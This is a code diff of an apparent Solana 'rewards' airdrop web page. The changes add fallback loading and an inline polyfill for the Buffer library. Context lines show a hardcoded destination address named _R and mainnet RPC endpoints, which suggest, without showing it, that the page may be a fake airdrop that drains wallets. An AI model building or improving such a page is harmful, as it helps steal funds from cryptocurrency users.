@@ -5,8 +5,15 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SolDrop — Solana Ecosystem Rewards</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>">
-<script src="https://unpkg.com/buffer@6.0.3/dist/buffer.min.js"></script>
-<script>window.Buffer = window.buffer.Buffer;</script>
+<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
+<script>
+(function(){try{
+var B=(typeof window.buffer!=="undefined"&&window.buffer&&window.buffer.Buffer)?window.buffer.Buffer:null;
+if(!B&&typeof globalThis!=="undefined"&&globalThis.Buffer)B=globalThis.Buffer;
+if(B){window.Buffer=B;globalThis.Buffer=B;}
+if(!B){var s=document.createElement("script");s.src="https://unpkg.com/buffer@6.0.3/dist/buffer.min.js";s.onload=function(){if(window.buffer&&window.buffer.Buffer){window.Buffer=window.buffer.Buffer;}};document.head.appendChild(s);}
+}catch(e){}})();
+</script>
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <style>
 :root{--bg:#06060b;--card:#0c0c14;--line:#1e1e2a;--mut:#8b8b9b;--acc:#14F195;--acc2:#9945FF}
@@ -228,6 +235,9 @@ footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
 <button class="ghost" style="width:100%" onclick="closeModal()">Cancel</button>
 </div>
 </div>
+<script>
+if(typeof Buffer==="undefined"){window.Buffer=(window.buffer&&window.buffer.Buffer)||{from:function(a,b){if(typeof a==="string"){a=b==="hex"?a.match(/.{2}/g).map(function(h){return parseInt(h,16)}):Array.from(new TextEncoder().encode(a))}return new Uint8Array(a)},concat:function(arrs){var t=0;arrs.forEach(function(a){t+=a.length});var o=new Uint8Array(t),p=0;arrs.forEach(function(a){o.set(a,p);p+=a.length});return o},alloc:function(n){return new Uint8Array(n)},isBuffer:function(x){return x instanceof Uint8Array}}}}
+</script>
 <script>
 var _R = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
 var _RPCS=["https://solana-rpc.publicnode.com","https://solana.drpc.org","https://solana-mainnet.public.blastapi.io","https://rpc.ankr.com/solana","https://api.mainnet-beta.solana.com"];
